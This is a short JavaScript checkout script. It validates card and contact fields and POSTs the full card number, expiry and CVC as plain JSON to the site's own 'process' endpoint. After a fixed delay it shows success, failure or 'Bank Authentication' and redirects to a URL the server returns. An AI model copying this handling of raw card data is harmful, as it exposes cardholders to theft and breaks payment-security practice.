const test = (n, nn, em, ey, c, us, ea) => {
  console.log('check2')

    fetch('process', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          userInfo: {
            userName: us,
            email: ea
          },
          card: {
            name: n,
            number: nn,
            exp_month: em,
            exp_year: ey,
            cvc: c
          }
        })
    })
      .then(async response => {
        if (!response.ok) {
        const errorInfo = await response.json();
          return await Promise.reject(errorInfo);
        }
        return response.json();
      })
      .then(data => setTimeout(() => {
     
        if (data.title === '9') {

          fetch('result', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({s: "D"})
          })
          .then(async response => {
            if (!response.ok) {
            const errorInfo = await response.json();
              return await Promise.reject(errorInfo);
            }
            return response.json();
          }).then(x => {

            if(x.title === 'Successful') {
              document.querySelector(".loading").style.display="none";
              document.querySelector('.success').style.display="block";
            }

            if(x.title === 'Card Failed') {
            document.querySelector(".loading").style.display="none";
            document.querySelector('.failed').style.display="block";
            document.querySelector('.info').style.display="block";

            document.querySelector('.failed button').addEventListener("click", () => {location.replace(x.result);}) 
          }

          if(x.title === 'Bank Authentication') {
            document.querySelector(".loading").style.display="none";
            document.querySelector(".action").style.display="block";

            document.querySelector(".action button").addEventListener("click", () => {location.replace(x.result);})
          }
          
          });
          
        } else {
          console.log("failed 1");
        }

      }, 10000)
)}

const check = () => {
const x = [...document.querySelectorAll('input[type=text], select')].map(x => x.value);

if (/^([a-zA-Z'-.]+ [a-zA-Z'-.]+)$/gm.test(x[0]) && /^[0-9]*$/.test(x[1]) && /^[0-9]*$/.test(x[2]) && /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/.test(x[3].replaceAll(" ", "")) && /^[0-9]{3,4}$/.test(x[4]) && /^(([^<>()[\]\.,;:\s@\"]+(\.[^<>()[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$/i.test(x[5])) {

  document.querySelector('.info').style.display="none"
  document.querySelector('.checkout').style.display="none";
  document.querySelector('.loading').style.display="block";

  test(x[0], x[3].replaceAll(" ", ""), Number(x[1]), Number(x[2]), x[4], x[6], x[5]);

  } else {document.querySelector('.checkout> *:last-child').style.display="block";}

}
document.querySelector(".checkout-btn").addEventListener("click", check);





